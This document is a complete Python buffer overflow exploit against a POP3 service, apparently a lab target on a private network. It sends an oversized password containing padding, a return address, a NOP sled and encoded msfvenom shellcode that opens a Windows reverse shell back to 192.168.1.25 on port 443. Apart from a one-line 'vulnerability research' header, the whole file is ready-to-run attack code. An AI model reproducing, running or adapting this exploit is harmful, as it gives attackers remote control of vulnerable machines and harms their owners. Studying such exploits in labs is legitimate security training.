# _Exploit:

"""
INFORMATION ABOUT THE SCRIPT
____________________________

Buffer Overflow Exploit (Vulnerability research)

_____________________________
"""

from socket import *

s = socket(AF_INET, SOCK_STREAM)

# msfvenom -p windows/shell_reverse_tcp lhost=192.168.1.25 lport=443 -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai -f python
buf = b""
buf += b"\xda\xd8\xd9\x74\x24\xf4\x58\x29\xc9\xb1\x52\xbe\x4a"
buf += b"\x06\x79\xea\x31\x70\x17\x03\x70\x17\x83\x8a\x02\x9b"
buf += b"\x1f\xf6\xe3\xd9\xe0\x06\xf4\xbd\x69\xe3\xc5\xfd\x0e"
buf += b"\x60\x75\xce\x45\x24\x7a\xa5\x08\xdc\x09\xcb\x84\xd3"
buf += b"\xba\x66\xf3\xda\x3b\xda\xc7\x7d\xb8\x21\x14\x5d\x81"
buf += b"\xe9\x69\x9c\xc6\x14\x83\xcc\x9f\x53\x36\xe0\x94\x2e"
buf += b"\x8b\x8b\xe7\xbf\x8b\x68\xbf\xbe\xba\x3f\xcb\x98\x1c"
buf += b"\xbe\x18\x91\x14\xd8\x7d\x9c\xef\x53\xb5\x6a\xee\xb5"
buf += b"\x87\x93\x5d\xf8\x27\x66\x9f\x3d\x8f\x99\xea\x37\xf3"
buf += b"\x24\xed\x8c\x89\xf2\x78\x16\x29\x70\xda\xf2\xcb\x55"
buf += b"\xbd\x71\xc7\x12\xc9\xdd\xc4\xa5\x1e\x56\xf0\x2e\xa1"
buf += b"\xb8\x70\x74\x86\x1c\xd8\x2e\xa7\x05\x84\x81\xd8\x55"
buf += b"\x67\x7d\x7d\x1e\x8a\x6a\x0c\x7d\xc3\x5f\x3d\x7d\x13"
buf += b"\xc8\x36\x0e\x21\x57\xed\x98\x09\x10\x2b\x5f\x6d\x0b"
buf += b"\x8b\xcf\x90\xb4\xec\xc6\x56\xe0\xbc\x70\x7e\x89\x56"
buf += b"\x80\x7f\x5c\xf8\xd0\x2f\x0f\xb9\x80\x8f\xff\x51\xca"
buf += b"\x1f\xdf\x42\xf5\xf5\x48\xe8\x0c\x9e\xb6\x45\x0f\x47"
buf += b"\x5f\x94\x0f\x76\x24\x11\xe9\x12\x4a\x74\xa2\x8a\xf3"
buf += b"\xdd\x38\x2a\xfb\xcb\x45\x6c\x77\xf8\xba\x23\x70\x75"
buf += b"\xa8\xd4\x70\xc0\x92\x73\x8e\xfe\xba\x18\x1d\x65\x3a"
buf += b"\x56\x3e\x32\x6d\x3f\xf0\x4b\xfb\xad\xab\xe5\x19\x2c"
buf += b"\x2d\xcd\x99\xeb\x8e\xd0\x20\x79\xaa\xf6\x32\x47\x33"
buf += b"\xb3\x66\x17\x62\x6d\xd0\xd1\xdc\xdf\x8a\x8b\xb3\x89"
buf += b"\x5a\x4d\xf8\x09\x1c\x52\xd5\xff\xc0\xe3\x80\xb9\xff"
buf += b"\xcc\x44\x4e\x78\x31\xf5\xb1\x53\xf1\x05\xf8\xf9\x50"
buf += b"\x8e\xa5\x68\xe1\xd3\x55\x47\x26\xea\xd5\x6d\xd7\x09"
buf += b"\xc5\x04\xd2\x56\x41\xf5\xae\xc7\x24\xf9\x1d\xe7\x6c"

address = b"\x71\xe8\xf1\x77"
nop = b"\x90" * 20
EIP = b"A" * 2606
ESP = b"C" * (3500 - 2606 - 4 - 20 - 355)

buffer = EIP + address + nop + buf + ESP

try:
    print("[+] ___Buffer Overflow Exploit___")
    conn = s.connect(("192.168.1.22", 110))

    s.recv(1024)
    s.send("User \r\n".encode())
    s.recv(1024)

    exp = b'pass ' + buffer + b'\r\n'
    s.send(exp)

    print("[+] Finished!")

except Exception as e:
    print("[-] Failed to start the exploit :(", e)
